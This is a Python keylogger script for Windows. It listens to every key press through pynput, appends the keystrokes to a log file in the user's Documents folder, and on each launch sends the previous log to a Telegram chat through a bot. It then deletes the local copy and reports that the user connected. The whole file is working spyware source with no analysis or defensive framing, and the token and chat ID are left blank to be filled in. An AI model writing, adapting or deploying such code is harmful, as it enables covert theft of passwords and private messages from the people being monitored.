import os
from datetime import datetime

import telebot
from pynput import keyboard


token = ''
chatID = ''
path = f'C:/Users/{os.getlogin()}/Documents'

def send(filename, isfile: bool):
    bot = telebot.TeleBot(token)

    if isfile:
        file = open(filename, 'rb')
        bot.send_document(chatID, file)
        file.close()
    else:
        bot.send_message(chatID, f'User {os.getlogin()} connected.')

try:
    file = open(f'{path}/log.txt')
    file.close()

except IOError as e:
    print('No data collected.')
    print('Starting keylogger...')

else:
    date = datetime.now()
    name = f'{os.getlogin()}_{date.month}-{date.day}-{date.year}_{date.hour}-{date.minute}.txt'
    os.rename(f'{path}/log.txt', name)
    send(name, True)
    os.remove(name)

send(0, False)

with open(f'{path}/log.txt', 'w+') as file:
    file.write(f'{os.getlogin()}\n')

def on_press(key):
    write = ''
    if type(key) != type(keyboard.Key.alt):
        if key.char != None:
            write += key.char
    elif key == keyboard.Key.space:
        write += ' '
    elif key == keyboard.Key.backspace:
        write = '<-'
    elif key == keyboard.Key.enter:
        write = '\n'
    
    with open(f'{path}/log.txt', 'at') as file:
        file.write(f'{write}')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()